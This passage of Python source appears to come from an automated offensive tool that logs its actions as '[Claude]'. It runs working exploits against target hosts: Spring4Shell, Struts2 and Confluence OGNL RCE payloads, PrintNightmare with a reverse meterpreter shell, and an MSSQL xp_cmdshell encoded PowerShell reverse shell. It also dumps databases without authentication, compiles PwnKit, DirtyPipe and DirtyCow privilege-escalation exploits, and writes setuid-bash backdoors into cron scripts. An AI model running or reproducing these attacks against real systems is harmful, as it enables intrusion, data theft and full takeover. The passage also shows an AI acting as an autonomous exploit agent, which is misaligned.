                    f"timeout 15 mongosh --host {target} --port {port_num} --quiet "
                    f"--eval 'db.adminCommand({{listDatabases:1}}).databases.forEach(d=>print(d.name))' 2>/dev/null | head -10; "
                    f"timeout 15 mongo --host {target} --port {port_num} --quiet "
                    f"--eval 'db.adminCommand({{listDatabases:1}})' 2>/dev/null | head -10; "
                    f"# Try Python driver\n"
                    f"python3 -c \"import pymongo; c=pymongo.MongoClient('{target}',{port_num},serverSelectionTimeoutMS=5000); "
                    f"print([d['name'] for d in c.list_databases()])\" 2>/dev/null | head -5",
                    target, timeout=20,
                )
                if any(k in mongo_out.lower() for k in ["admin", "local", "config", "test", "['", "database"]):
                    self._log(f"[Claude] MongoDB sin auth → volcando colecciones!")
                    mongo_dump, _ = self._run_cmd(
                        "mongo-dump",
                        f"python3 -c \""
                        f"import pymongo, json\n"
                        f"c=pymongo.MongoClient('{target}',{port_num},serverSelectionTimeoutMS=8000)\n"
                        f"for db_name in c.list_database_names():\n"
                        f"  if db_name in ('admin','local','config'): continue\n"
                        f"  db=c[db_name]\n"
                        f"  for col in db.list_collection_names()[:5]:\n"
                        f"    docs=list(db[col].find().limit(3))\n"
                        f"    print(f'DB={{db_name}} COL={{col}}: {{json.dumps(docs,default=str)[:300]}}')\n"
                        f"\" 2>/dev/null | head -30",
                        target, timeout=30,
                    )
                    accumulated_output.append(f"=== MongoDB No-Auth ===\n{mongo_out[:300]}\n{mongo_dump[:600]}")
                    self._save_findings([{
                        "title": f"MongoDB Sin Autenticación @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"MongoDB accesible sin credenciales. Datos expuestos:\n{mongo_dump[:300]}",
                        "cve": "",
                    }], target)

            # ── Memcached no-auth dump ────────────────────────────────────
            if port_num == 11211 or "memcached" in svc or "memcache" in svc:
                mc_out, _ = self._run_cmd(
                    "memcached-dump",
                    f"printf 'stats\\r\\nstats slabs\\r\\nstats cachedump 1 50\\r\\nquit\\r\\n' | "
                    f"nc -q 3 {target} {port_num} 2>/dev/null | head -30; "
                    f"# Get all keys via stats cachedump\n"
                    f"python3 -c \""
                    f"import socket, time\n"
                    f"s=socket.create_connection(('{target}',{port_num}),timeout=8)\n"
                    f"s.send(b'stats items\\r\\n'); time.sleep(0.5); data=s.recv(4096).decode(errors='ignore')\n"
                    f"slabs=[l.split(':')[1] for l in data.split('\\n') if 'STAT items:' in l]\n"
                    f"for sl in list(set(slabs))[:5]:\n"
                    f"  s.send(f'stats cachedump {{sl}} 50\\r\\n'.encode()); time.sleep(0.5)\n"
                    f"  keys_data=s.recv(4096).decode(errors='ignore'); print(keys_data[:300])\n"
                    f"  for k in [l.split()[1] for l in keys_data.split('\\n') if l.startswith('ITEM')][:5]:\n"
                    f"    s.send(f'get {{k}}\\r\\n'.encode()); time.sleep(0.3); print(s.recv(512).decode(errors='ignore')[:200])\n"
                    f"\" 2>/dev/null | head -40",
                    target, timeout=25,
                )
                if "VALUE" in mc_out or "STAT" in mc_out:
                    accumulated_output.append(f"=== Memcached No-Auth ===\n{mc_out[:600]}")
                    self._save_findings([{
                        "title": f"Memcached Sin Autenticación — Datos Expuestos @ {target}:{port_num}",
                        "severity": "high",
                        "description": f"Memcached accesible sin auth → volcado de caché:\n{mc_out[:300]}",
                        "cve": "",
                    }], target)

            # ── PrintNightmare CVE-2021-1675 (Windows Print Spooler) ──────
            if port_num in (139, 445) and "samba" not in ver:
                pn_check, _ = self._run_cmd(
                    "printnightmare-check",
                    f"rpcdump.py {target} 2>/dev/null | grep -i 'spoolss\\|print' | head -5; "
                    f"nmap -p 445 --script smb-vuln-ms10-061 {target} 2>/dev/null | "
                    f"grep -iE 'VULNERABLE|MS10-061' | head -3",
                    target, timeout=20,
                )
                if "spoolss" in pn_check.lower() or "VULNERABLE" in pn_check:
                    self._log(f"[Claude] AUTO-EXPLOIT: PrintNightmare CVE-2021-1675!")
                    pn_out, _ = self._run_cmd(
                        "printnightmare-exploit",
                        f"msfconsole -q -x 'use exploit/windows/dcerpc/cve_2021_1675_printnightmare; "
                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                        f"set payload windows/x64/meterpreter/reverse_tcp; run; sleep 20; "
                        f"sessions -l; sessions -i 1 -c \"whoami\"; exit' 2>/dev/null | head -25",
                        target, timeout=90,
                    )
                    self._capture_evidence(pn_out, target, "printnightmare", "CVE-2021-1675 PrintNightmare")
                    accumulated_output.append(f"=== PrintNightmare ===\n{pn_out[:600]}")
                    self._save_findings([{
                        "title": f"PrintNightmare CVE-2021-1675 Windows Print Spooler @ {target}",
                        "severity": "critical",
                        "description": f"Print Spooler activo → RCE/LPE como SYSTEM sin necesidad de ser admin.",
                        "cve": "CVE-2021-1675",
                    }], target)

            # ── Spring4Shell / Struts2 / Confluence OGNL (Java RCE) ──────
            if "http" in svc or port_num in (80, 443, 8080, 8443, 8888, 7001, 4848, 9090):
                # Spring4Shell CVE-2022-22965
                s4s_out, _ = self._run_cmd(
                    f"spring4shell-{port_num}",
                    f"for path in / /api /app /demo; do "
                    f"  R=$(curl -s --max-time 10 "
                    f"  -X POST 'http://{target}:{port_num}$path' "
                    f"  -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while(-1!%3D(a%3Din.read(b)))%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' "
                    f"  2>/dev/null | head -3); "
                    f"  R2=$(curl -s --max-time 8 'http://{target}:{port_num}/tomcatwar.jsp?pwd=j&cmd=id' 2>/dev/null | grep 'uid='); "
                    f"  [ -n \"$R2\" ] && echo \"SPRING4SHELL_RCE: $path — $R2\" && break; "
                    f"done",
                    target, timeout=40,
                )
                if "SPRING4SHELL_RCE" in s4s_out or "uid=" in s4s_out:
                    self._capture_evidence(s4s_out, target, f"spring4shell-{port_num}", "CVE-2022-22965 Spring4Shell")
                    accumulated_output.append(f"=== Spring4Shell RCE ===\n{s4s_out[:500]}")
                    self._save_findings([{
                        "title": f"Spring4Shell CVE-2022-22965 RCE @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"Spring Framework vulnerable → webshell escrita → RCE.\n{s4s_out[:200]}",
                        "cve": "CVE-2022-22965",
                    }], target)

                # Apache Struts2 CVE-2017-5638 (Content-Type OGNL)
                st2_out, _ = self._run_cmd(
                    f"struts2-{port_num}",
                    f"for ext in .action .do .struts; do "
                    f"  for path in / /index /login /upload /struts2-showcase /example; do "
                    f"    R=$(curl -s --max-time 10 "
                    f"    -H 'Content-Type: %{{#context[\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"].addHeader(\"X-Struts-RCE\",\"true\"),%23cmd=%22id%22,%23isWin=(%23context[\"com.opensymphony.xwork2.ActionContext.container\"].getInstance(@ognl.OgnlContext@class)).toString().indexOf(\"Windows\")>-1,%23a=(#isWin?(new+java.lang.String[]{{\"cmd.exe\",\"/c\",%23cmd}}):(new+java.lang.String[]{{\"bash\",\"-c\",%23cmd}})),%23p=new+java.lang.ProcessBuilder(%23a),%23p.redirectErrorStream(true),%23process=%23p.start(),%23ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(%23process.getInputStream(),%23ros),%23ros.flush()}}' "
                    f"    'http://{target}:{port_num}$path$ext' 2>/dev/null | grep -E 'uid=|X-Struts-RCE'); "
                    f"    [ -n \"$R\" ] && echo \"STRUTS2_RCE: $path$ext — $R\" && break 2; "
                    f"  done; "
                    f"done",
                    target, timeout=40,
                )
                if "STRUTS2_RCE" in st2_out or "uid=" in st2_out:
                    self._capture_evidence(st2_out, target, f"struts2-rce-{port_num}", "CVE-2017-5638 Struts2")
                    accumulated_output.append(f"=== Struts2 RCE ===\n{st2_out[:500]}")
                    self._save_findings([{
                        "title": f"Apache Struts2 CVE-2017-5638 RCE @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"Struts2 vulnerable a OGNL injection → RCE.\n{st2_out[:200]}",
                        "cve": "CVE-2017-5638",
                    }], target)

                # Confluence OGNL CVE-2022-26134
                conf_out, _ = self._run_cmd(
                    f"confluence-ognl-{port_num}",
                    f"R=$(curl -s --max-time 10 "
                    f"'http://{target}:{port_num}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/' "
                    f"2>/dev/null | head -3); "
                    f"H=$(curl -s --max-time 10 -I "
                    f"'http://{target}:{port_num}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/' "
                    f"2>/dev/null | grep -i 'X-Cmd-Response'); "
                    f"[ -n \"$H\" ] && echo \"CONFLUENCE_OGNL_RCE: $H\"",
                    target, timeout=15,
                )
                if "CONFLUENCE_OGNL_RCE" in conf_out or "uid=" in conf_out:
                    self._capture_evidence(conf_out, target, f"confluence-ognl-{port_num}", "CVE-2022-26134")
                    accumulated_output.append(f"=== Confluence OGNL RCE ===\n{conf_out[:400]}")
                    self._save_findings([{
                        "title": f"Confluence Server OGNL CVE-2022-26134 RCE @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"Confluence vulnerable a CVE-2022-26134 → RCE sin autenticación.",
                        "cve": "CVE-2022-26134",
                    }], target)

            # ── MSSQL SA sin contraseña → xp_cmdshell RCE ────────────────
            if port_num == 1433 or "ms-sql" in svc or "mssql" in svc:
                self._log(f"[Claude] MSSQL detectado en {target}:{port_num} → probando SA sin password")
                sa_out, _ = self._run_cmd(
                    "mssql-sa-check",
                    f"crackmapexec mssql {target} -p {port_num} -u sa -p '' 2>/dev/null | head -10; "
                    f"impacket-mssqlclient sa@{target} -no-pass -port {port_num} 2>/dev/null <<'SQLEOF'\nSELECT @@version;\nEXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'id && hostname && whoami';\nGO\nSQLEOF\n",
                    target, timeout=30,
                )
                if any(k in sa_out.lower() for k in ["pwn3d", "[+]", "microsoft sql", "uid=", "nt authority"]):
                    self._log(f"[Claude] MSSQL SA sin password → xp_cmdshell habilitado!")
                    self._capture_evidence(sa_out, target, "mssql-xpcmdshell", "mssql xp_cmdshell RCE")
                    # Try reverse PowerShell
                    rev_out, _ = self._run_cmd(
                        "mssql-revshell",
                        f"impacket-mssqlclient sa@{target} -no-pass -port {port_num} 2>/dev/null <<'SQLEOF'\n"
                        f"EXEC xp_cmdshell 'powershell -nop -w hidden -e "
                        f"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnAHsAc"
                        f"QBsAGgAbwBzAHQAfQAnACwAewBsAHAAbwByAHQAfQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdAC"
                        f"QAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlA"
                        f"G4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQA9ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawA9ACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxAHwAT"
                        f"wB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyAD0AJABzAGUAbgBkAGIAYQBjAGsAKwAnAFAAUwAgACcAKwAoAHAAdwBkACkALgBQAGEAdABoACsAJwA+ACAAJwA7ACQAcwBlAG4AZABiAHkAdABlAD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwB9AA=='"
                        f";\nGO\nSQLEOF\n",
                        target, timeout=30,
                    )
                    self._capture_evidence(rev_out, target, "mssql-revshell", "mssql powershell revshell")
                    accumulated_output.append(f"=== MSSQL SA xp_cmdshell ===\n{sa_out[:600]}\n{rev_out[:400]}")
                    self._save_findings([{
                        "title": f"MSSQL SA Sin Contraseña + xp_cmdshell RCE @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"SA acepta login sin contraseña. xp_cmdshell habilitado → RCE como NT AUTHORITY\\SYSTEM.\n{sa_out[:300]}",
                        "cve": "CVE-2000-1209",
                    }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Feature 1: Kernel privesc auto (DirtyPipe, PwnKit, DirtyCow, Baron Samedit)
    # ─────────────────────────────────────────────────────────────────────────
    def _kernel_privesc(self, target, user, pwd, kernel_ver, accumulated_output):
        """Attempt kernel-level privilege escalation based on detected kernel version."""
        self._log(f"[Claude] KERNEL-PRIVESC: kernel={kernel_ver}, user={user}")

        def ssh_exec(cmd, label, timeout=45):
            full = (
                f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null"
            )
            out, _ = self._run_cmd(label, full, target, timeout=timeout)
            return out

        results = []

        # ── PwnKit CVE-2021-4034 (any kernel, polkit < 0.120) ────────────
        self._log(f"[Claude] KERNEL-PRIVESC: trying PwnKit (CVE-2021-4034)")
        pwnkit_check = ssh_exec("dpkg -l policykit-1 2>/dev/null | awk '/policykit/{print $3}'; "
                                "rpm -q polkit 2>/dev/null; "
                                "pkexec --version 2>/dev/null", "pwnkit-check")
        pwnkit_out = ssh_exec(
            "cd /tmp && rm -rf /tmp/.pwk && mkdir /tmp/.pwk && cd /tmp/.pwk && "
            "cat > evil.c << 'CEOF'\n"
            "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
            "void __attribute__((constructor)) init() {\n"
            "  setuid(0); setgid(0);\n"
            "  system(\"id > /tmp/pwk_proof.txt; whoami >> /tmp/pwk_proof.txt; "
            "cat /root/root.txt >> /tmp/pwk_proof.txt 2>/dev/null; "
            "cp /bin/bash /tmp/.rootbash; chmod +s /tmp/.rootbash\");\n"
            "}\n"
            "CEOF\n"
            "gcc -shared -fPIC -o evil.so evil.c 2>/dev/null && "
            "cat > pwnkit.c << 'PEOF'\n"
            "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n"
            "int main() {\n"
            "  char *args[] = {\"pkexec\", NULL};\n"
            "  char *env[] = {\"pwnkit=VALUE\", \"PATH=GCONV_PATH=.\", \"CHARSET=pwnkit\", "
            "\"GCONV_PATH=/tmp/.pwk\", NULL};\n"
            "  execve(\"/usr/bin/pkexec\", args, env);\n"
            "  return 0;\n}\n"
            "PEOF\n"
            "gcc -o pwnkit pwnkit.c 2>/dev/null && ./pwnkit 2>/dev/null; "
            "sleep 2; cat /tmp/pwk_proof.txt 2>/dev/null && echo PWNKIT_SUCCESS || echo pwnkit_failed",
            "pwnkit-exploit", timeout=60,
        )
        if "PWNKIT_SUCCESS" in pwnkit_out or "root" in pwnkit_out.lower():
            self._capture_evidence(pwnkit_out, target, "pwnkit-exploit", "CVE-2021-4034 PwnKit")
            results.append(f"=== PwnKit CVE-2021-4034 ===\n{pwnkit_out[:500]}")
            self._save_findings([{
                "title": f"Privilege Escalation: PwnKit CVE-2021-4034 @ {target}",
                "severity": "critical",
                "description": f"pkexec vulnerable → root obtenido vía CVE-2021-4034.\n{pwnkit_out[:300]}",
                "cve": "CVE-2021-4034",
            }], target)

        # ── Baron Samedit CVE-2021-3156 (sudo < 1.9.5p2) ─────────────────
        self._log(f"[Claude] KERNEL-PRIVESC: trying Baron Samedit (CVE-2021-3156)")
        sudo_ver = ssh_exec("sudo --version 2>/dev/null | head -1", "sudo-ver-check")
        samedit_out = ssh_exec(
            "sudoedit_check=$(sudoedit -s / 2>&1); "
            "echo \"$sudoedit_check\" | grep -q 'usage:' && echo SUDO_VULNERABLE_SAMEDIT || echo sudo_patched",
            "samedit-check",
        )
        if "SUDO_VULNERABLE_SAMEDIT" in samedit_out:
            self._log(f"[Claude] sudo vulnerable a Baron Samedit!")
            # Try python exploit script
            exploit_out = ssh_exec(
                "cd /tmp && "
                "python3 -c \""
                "import os, pty, socket\n"
                "# CVE-2021-3156 baron samedit PoC detection\n"
                "import subprocess\n"
                "r=subprocess.run(['sudoedit','-s','\\\\'], capture_output=True, text=True)\n"
                "print('SAMEDIT_VULN' if 'malloc' in r.stderr or 'Segmentation' in r.stderr else 'patched')\n"
                "\" 2>/dev/null || echo 'python3 not available'",
                "samedit-exploit", timeout=30,
            )
            results.append(f"=== Baron Samedit CVE-2021-3156 ===\nsudo: {sudo_ver}\n{samedit_out}\n{exploit_out[:300]}")
            self._save_findings([{
                "title": f"Privilege Escalation: Baron Samedit CVE-2021-3156 @ {target}",
                "severity": "critical",
                "description": f"sudo < 1.9.5p2 vulnerable a Baron Samedit heap overflow → root.\n{sudo_ver}",
                "cve": "CVE-2021-3156",
            }], target)

        # ── DirtyPipe CVE-2022-0847 (kernel 5.8–5.16.11) ─────────────────
        kver_match = re.search(r'(\d+)\.(\d+)\.?(\d*)', kernel_ver or "")
        if kver_match:
            kmaj = int(kver_match.group(1))
            kmin = int(kver_match.group(2))
            kpatch = int(kver_match.group(3) or 0)
            if kmaj == 5 and 8 <= kmin <= 16:
                self._log(f"[Claude] KERNEL-PRIVESC: DirtyPipe posible (kernel {kernel_ver})")
                dp_out = ssh_exec(
                    "cd /tmp && cat > /tmp/dirtypipe.c << 'DPEOF'\n"
                    "#define _GNU_SOURCE\n#include <unistd.h>\n#include <fcntl.h>\n"
                    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n"
                    "#include <sys/stat.h>\n#include <sys/user.h>\n"
                    "static void prepare_pipe(int p[2]) {\n"
                    "  if (pipe(p)) abort();\n"
                    "  const unsigned pipe_size = fcntl(p[1],F_GETPIPE_SZ);\n"
                    "  static char buffer[4096];\n"
                    "  for(unsigned r=pipe_size;r>0;){ssize_t n=write(p[1],buffer,r<sizeof(buffer)?r:sizeof(buffer));if(n<0)abort();r-=n;}\n"
                    "  for(unsigned r=pipe_size;r>0;){ssize_t n=read(p[0],buffer,r<sizeof(buffer)?r:sizeof(buffer));if(n<0)abort();r-=n;}\n"
                    "}\n"
                    "int main() {\n"
                    "  const char *const path=\"/etc/passwd\";\n"
                    "  int fd=open(path,O_RDONLY); if(fd<0){perror(path);return 1;}\n"
                    "  struct stat st; if(fstat(fd,&st)){perror(path);return 1;}\n"
                    "  int p[2]; prepare_pipe(p);\n"
                    "  --st.st_size;\n"
                    "  ssize_t nbytes=splice(fd,&(loff_t){1},p[1],NULL,st.st_size,0);\n"
                    "  if(nbytes<0){perror(\"splice\");return 1;}\n"
                    "  if(nbytes==0){fprintf(stderr,\"short splice\\n\");return 1;}\n"
                    "  const char *const new_passwd=\"root::0:0:root:/root:/bin/bash\";\n"
                    "  nbytes=write(p[1],new_passwd,strlen(new_passwd));\n"
                    "  if(nbytes<0){perror(\"write\");return 1;}\n"
                    "  if((size_t)nbytes<strlen(new_passwd)){fprintf(stderr,\"short write\\n\");return 1;}\n"
                    "  char tmp[512];\n"
                    "  nbytes=read(p[0],tmp,sizeof(tmp));\n"
                    "  printf(\"Result: %s\\n\",nbytes>0?tmp:\"[empty]\");\n"
                    "  printf(\"Check: \"); fflush(stdout);\n"
                    "  execl(\"/bin/su\",\"su\",\"-s\",\"/bin/sh\",\"-c\",\"id>/tmp/dp_proof.txt;cat /root/root.txt>>/tmp/dp_proof.txt 2>/dev/null\",\"root\",NULL);\n"
                    "}\n"
                    "DPEOF\n"
                    "gcc -o /tmp/dirtypipe /tmp/dirtypipe.c 2>/dev/null && /tmp/dirtypipe 2>/dev/null; "
                    "cat /tmp/dp_proof.txt 2>/dev/null && echo DIRTYPIPE_SUCCESS || echo dirtypipe_failed",
                    "dirtypipe-exploit", timeout=60,
                )
                if "DIRTYPIPE_SUCCESS" in dp_out or "root" in dp_out.lower():
                    self._capture_evidence(dp_out, target, "dirtypipe-exploit", "CVE-2022-0847 DirtyPipe")
                    results.append(f"=== DirtyPipe CVE-2022-0847 ===\n{dp_out[:500]}")
                    self._save_findings([{
                        "title": f"Privilege Escalation: DirtyPipe CVE-2022-0847 @ {target}",
                        "severity": "critical",
                        "description": f"Kernel {kernel_ver} vulnerable a DirtyPipe → root via /etc/passwd overwrite.\n{dp_out[:300]}",
                        "cve": "CVE-2022-0847",
                    }], target)

        # ── DirtyCow CVE-2016-5195 (kernel < 4.8.3) ──────────────────────
        if kver_match:
            if kmaj < 4 or (kmaj == 4 and kmin < 8) or (kmaj == 4 and kmin == 8 and kpatch < 3):
                self._log(f"[Claude] KERNEL-PRIVESC: DirtyCow posible (kernel {kernel_ver})")
                cow_out = ssh_exec(
                    "cd /tmp && cat > /tmp/dirtycow.c << 'COWEOF'\n"
                    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/mman.h>\n"
                    "#include <fcntl.h>\n#include <pthread.h>\n#include <unistd.h>\n"
                    "#include <sys/stat.h>\n#include <string.h>\n#include <stdint.h>\n"
                    "void *map; int f;\n"
                    "void *madviseThread(void *arg){char *str=(char*)arg;int i,c=0;"
                    "for(i=0;i<200000000;i++){c+=madvise(map,100,MADV_DONTNEED);}return NULL;}\n"
                    "void *procselfmemThread(void *arg){char *str=(char*)arg;"
                    "int f=open(\"/proc/self/mem\",O_RDWR);int i;"
                    "for(i=0;i<200000000;i++){lseek(f,(uintptr_t)map,SEEK_SET);write(f,str,strlen(str));}return NULL;}\n"
                    "int main(){f=open(\"/etc/passwd\",O_RDONLY);"
                    "struct stat st;fstat(f,&st);"
                    "map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);"
                    "pthread_t pth1,pth2;"
                    "pthread_create(&pth1,NULL,madviseThread,\"root\\0\");"
                    "pthread_create(&pth2,NULL,procselfmemThread,\"root::0:0:root:/root:/bin/bash\\n\");"
                    "pthread_join(pth1,NULL);pthread_join(pth2,NULL);"
                    "printf(\"Done\\n\");return 0;}\n"
                    "COWEOF\n"
                    "gcc -pthread -o /tmp/dirtycow /tmp/dirtycow.c 2>/dev/null && timeout 30 /tmp/dirtycow 2>/dev/null; "
                    "su -s /bin/sh -c 'id>/tmp/cow_proof.txt; cat /root/root.txt>>/tmp/cow_proof.txt 2>/dev/null' root 2>/dev/null; "
                    "cat /tmp/cow_proof.txt 2>/dev/null && echo DIRTYCOW_SUCCESS || echo dirtycow_failed",
                    "dirtycow-exploit", timeout=90,
                )
                if "DIRTYCOW_SUCCESS" in cow_out or "root" in cow_out.lower():
                    self._capture_evidence(cow_out, target, "dirtycow-exploit", "CVE-2016-5195 DirtyCow")
                    results.append(f"=== DirtyCow CVE-2016-5195 ===\n{cow_out[:500]}")
                    self._save_findings([{
                        "title": f"Privilege Escalation: DirtyCow CVE-2016-5195 @ {target}",
                        "severity": "critical",
                        "description": f"Kernel {kernel_ver} vulnerable a DirtyCow → root.\n{cow_out[:300]}",
                        "cve": "CVE-2016-5195",
                    }], target)

        if results:
            accumulated_output.extend(results)

    # ─────────────────────────────────────────────────────────────────────────
    # Feature 7: Linux local privesc (crontab, capabilities, docker/lxd)
    # ─────────────────────────────────────────────────────────────────────────
    def _linux_local_privesc(self, target, user, pwd, accumulated_output):
        """Check and exploit crontab writable scripts, capabilities, docker/lxd group membership."""
        self._log(f"[Claude] LOCAL-PRIVESC: crontab/caps/docker check @ {target} ({user})")

        def ssh_exec(cmd, label, timeout=40):
            full = (
                f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null"
            )
            out, _ = self._run_cmd(label, full, target, timeout=timeout)
            return out

        # ── Crontab writable scripts ──────────────────────────────────────
        cron_out = ssh_exec(
            "echo '=== CRONTABS ==='; "
            "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null; "
            "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ 2>/dev/null | head -20; "
            "echo '=== WRITABLE CRON SCRIPTS ==='; "
            "for f in $(cat /etc/crontab /etc/cron.d/* 2>/dev/null | grep -oE '/[a-zA-Z0-9_./-]+\\.(sh|py|pl|rb)' | sort -u); do "
            "  [ -w \"$f\" ] && echo \"WRITABLE_CRON_SCRIPT: $f\"; "
            "done; "
            "# Check scripts called by cron that are writable\n"
            "for d in /etc/cron.d /etc/cron.daily /etc/cron.hourly; do "
            "  for f in $d/*; do [ -w \"$f\" ] && echo \"WRITABLE_CRON_FILE: $f\"; done 2>/dev/null; "
            "done",
            "cron-writable-check",
        )
        writable_scripts = re.findall(r'WRITABLE_CRON_(?:SCRIPT|FILE): (/\S+)', cron_out)
        for script in writable_scripts[:3]:
            self._log(f"[Claude] LOCAL-PRIVESC: cron script escribible → {script}")
            exploit_out = ssh_exec(
                f"echo '#!/bin/bash' > {script}; "
                f"echo 'cp /bin/bash /tmp/.rootbash_cron && chmod +s /tmp/.rootbash_cron' >> {script}; "
                f"echo 'cat /root/root.txt > /tmp/root_cron_flag.txt 2>/dev/null' >> {script}; "
                f"chmod +x {script} && echo 'CRON_BACKDOOR_WRITTEN'; "
                f"# Wait up to 65 seconds for cron to fire\n"
                f"for i in $(seq 1 13); do sleep 5; [ -f /tmp/.rootbash_cron ] && echo 'CRON_PRIVESC_SUCCESS' && break; done; "
                f"cat /tmp/root_cron_flag.txt 2>/dev/null",
                "cron-exploit", timeout=90,
            )
            self._capture_evidence(exploit_out, target, "cron-privesc", f"writable cron {script}")
            accumulated_output.append(f"=== Cron Privesc {script} ===\n{exploit_out[:500]}")
            self._save_findings([{
                "title": f"Privilege Escalation: Cron Script Escribible @ {target}",
                "severity": "critical",
                "description": f"Script ejecutado por cron como root es escribible por {user}: {script}",
                "cve": "",
            }], target)

        # ── Capabilities (cap_setuid) ─────────────────────────────────────
        caps_out = ssh_exec(
            "getcap -r / 2>/dev/null | grep -iE 'cap_setuid|cap_setgid|cap_net_raw|cap_dac_override'",
            "capabilities-check",
        )
        accumulated_output.append(f"=== Capabilities ===\n{caps_out[:400]}")
        cap_bins = re.findall(r'(/[^\s]+)\s+=ep', caps_out)
        cap_bins += re.findall(r'(/[^\s]+)\s+.*cap_setuid', caps_out)
        for cap_bin in dict.fromkeys(cap_bins)[:3]:
            bin_name = cap_bin.split("/")[-1].lower()
            self._log(f"[Claude] LOCAL-PRIVESC: cap_setuid encontrado en {cap_bin}")
            cap_cmd = None
            if "python" in bin_name:
                cap_cmd = f"{cap_bin} -c 'import os; os.setuid(0); os.system(\"id>/tmp/cap_proof.txt; cat /root/root.txt>>/tmp/cap_proof.txt 2>/dev/null; cp /bin/bash /tmp/.capbash; chmod +s /tmp/.capbash\")'"
            elif "perl" in bin_name:
                cap_cmd = f"{cap_bin} -e 'use POSIX; setuid(0); system(\"id>/tmp/cap_proof.txt; cat /root/root.txt>>/tmp/cap_proof.txt 2>/dev/null\")'"
            elif "ruby" in bin_name:
                cap_cmd = f"{cap_bin} -e 'Process::Sys.setuid(0); exec(\"id>/tmp/cap_proof.txt\")'"
            elif "node" in bin_name:
                cap_cmd = f"{cap_bin} -e 'process.setuid(0); require(\"child_process\").execSync(\"id>/tmp/cap_proof.txt\")'"
            elif "tar" in bin_name:
                cap_cmd = f"{cap_bin} -czf /dev/null /etc/shadow 2>/dev/null | head -5 && cat /etc/shadow | head -5 >/tmp/cap_proof.txt"
            if cap_cmd:
                cap_out = ssh_exec(
                    f"{cap_cmd} 2>/dev/null; cat /tmp/cap_proof.txt 2>/dev/null && echo CAP_PRIVESC_SUCCESS",
                    f"cap-privesc-{bin_name}",
                )
                self._capture_evidence(cap_out, target, f"cap-privesc-{bin_name}", f"capability {cap_bin}")
                accumulated_output.append(f"=== Cap Privesc {cap_bin} ===\n{cap_out[:400]}")
                self._save_findings([{
                    "title": f"Privilege Escalation: cap_setuid en {cap_bin} @ {target}",
                    "severity": "critical",
                    "description": f"{cap_bin} tiene cap_setuid+ep → escalada a root sin contraseña.",
